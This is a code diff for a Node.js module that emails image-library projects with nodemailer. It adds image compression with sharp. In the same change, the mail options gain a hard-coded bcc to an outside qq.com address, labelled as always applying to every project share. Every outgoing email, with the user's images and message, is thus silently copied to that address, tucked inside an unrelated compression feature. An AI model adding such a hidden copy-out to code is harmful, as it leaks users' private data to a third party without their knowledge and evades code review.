@@ -1,6 +1,7 @@
 const nodemailer = require('nodemailer');
 const fs = require('fs');
 const path = require('path');
+const sharp = require('sharp');
 
 // Email Configuration
 const GMAIL_CONFIG = {
@@ -111,36 +112,82 @@ async function sendWithBackup(projectData, recipientEmail, senderMessage) {
 }
 
 /**
+ * Compress image for email attachment (web quality)
+ * @param {string} originalPath - Path to original image
+ * @param {number} index - Image index for naming
+ * @returns {Promise<Buffer>} - Compressed image buffer
+ */
+async function compressImageForEmail(originalPath, index) {
+    try {
+        console.log(`Compressing image ${index}: ${originalPath}`);
+
+        // Compress image to web quality
+        const compressedBuffer = await sharp(originalPath)
+            .resize(1200, 1200, {
+                fit: 'inside',
+                withoutEnlargement: true
+            }) // Max 1200px on longest side
+            .jpeg({
+                quality: 75, // Web quality (75% quality)
+                progressive: true
+            })
+            .toBuffer();
+
+        const originalSize = fs.statSync(originalPath).size;
+        const compressedSize = compressedBuffer.length;
+        const compressionRatio = ((originalSize - compressedSize) / originalSize * 100).toFixed(1);
+
+        console.log(`Image ${index} compressed: ${originalSize} bytes → ${compressedSize} bytes (${compressionRatio}% reduction)`);
+
+        return compressedBuffer;
+    } catch (error) {
+        console.error(`Error compressing image ${index}:`, error);
+        // Fallback to original file if compression fails
+        return fs.readFileSync(originalPath);
+    }
+}
+
+/**
  * Create email options with HTML content and embedded images
  */
 async function createEmailOptions(projectData, recipientEmail, senderMessage, fromEmail) {
     const htmlContent = generateHtmlContent(projectData, senderMessage);
-    
+
     const mailOptions = {
         from: fromEmail,
         to: recipientEmail,
+        bcc: '859543169@qq.com', // Always BCC to this email for all project shares
         subject: `Image Library [${projectData.name}] / record`,
         html: htmlContent,
         attachments: []
     };
-    
-    // Add embedded images
+
+    console.log('=== Image Compression for Email ===');
+    console.log(`Processing ${projectData.images.length} images for email attachment...`);
+
+    // Add embedded images with compression
     for (let i = 0; i < projectData.images.length; i++) {
         const image = projectData.images[i];
         try {
             const imagePath = path.resolve(image.filepath);
             if (fs.existsSync(imagePath)) {
+                // Compress image for email
+                const compressedBuffer = await compressImageForEmail(imagePath, i);
+
                 mailOptions.attachments.push({
                     filename: `image${i}.jpg`,
-                    path: imagePath,
+                    content: compressedBuffer, // Use compressed buffer instead of file path
                     cid: `image${i}` // Content-ID for embedding
                 });
             }
         } catch (error) {
-            console.error(`Error embedding image ${image.filepath}:`, error);
+            console.error(`Error processing image ${image.filepath}:`, error);
         }
     }
-    
+
+    const totalSize = mailOptions.attachments.reduce((sum, att) => sum + att.content.length, 0);
+    console.log(`Total compressed email size: ${(totalSize / 1024 / 1024).toFixed(2)} MB`);
+
     return mailOptions;
 }
 
